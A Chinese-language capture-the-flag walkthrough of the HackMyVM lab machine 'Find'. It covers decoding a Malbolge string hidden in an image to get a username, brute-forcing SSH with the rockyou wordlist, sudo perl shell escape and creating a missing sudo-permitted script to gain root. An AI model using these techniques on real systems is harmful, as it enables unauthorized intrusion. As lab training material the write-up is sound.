# Find

2025.02.04 https://hackmyvm.eu/machines/machine.php?vm=Find

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

直接看 80 web 服务，一般 22 ssh 不会出现直接问题。web 首页是 apache 的服务页面，gobuster 扫描一下隐藏目录。

http://192.168.5.40/robots.txt 提示: find user :) 同时发现一个图片: http://192.168.5.40/cat.jpg 。可能有隐写，exiftool 发现 https://commons.wikimedia.org/wiki/File:Cat03.jpg，原图中也有一个cat.jpg，但是这两个cat图片的内容不一样，对比后发现在cat.jpg的末尾中多出来了一串字符串：

```
>C<;_"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\Uy<XW
VOsrRKPONGk.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML
KJIHGFEDZY^W\[ZYXWPOsSRQPON0Fj-IHAeR
```

经过搜索，找到了这个解密网站: https://www.malbolge.doleczek.pl/ 解密后得到用户名: missyred

目前得到了用户名，根据提示，可能需要这个用户名登陆 ssh，尝试 rockyouo 爆破，得到密码: iloveyou

登陆后，sudo -l 发现: (kings) /usr/bin/perl , 提权到用户 kings : sudo -u kings perl -e 'exec "/bin/bash";'

得到 user flag:

```
$ cat user.txt
f4e690f638c01bd8a19fb1349d40519c
```

sudo -l 发现: (ALL) NOPASSWD: /opt/boom/boom.sh 但是这个文件并不存在，我们可以手动创建，然后直接提权到 root。

```
mkdir -p /opt/boom/
echo '/bin/bash' > /opt/boom/boom.sh
chmod +x /opt/boom/boom.sh
sudo -u root /opt/boom/boom.sh
```

最终得到了 root flag:

```
root@find:~# cat root.txt
c8aaf0f3189e000006c305bbfcbeb790
```
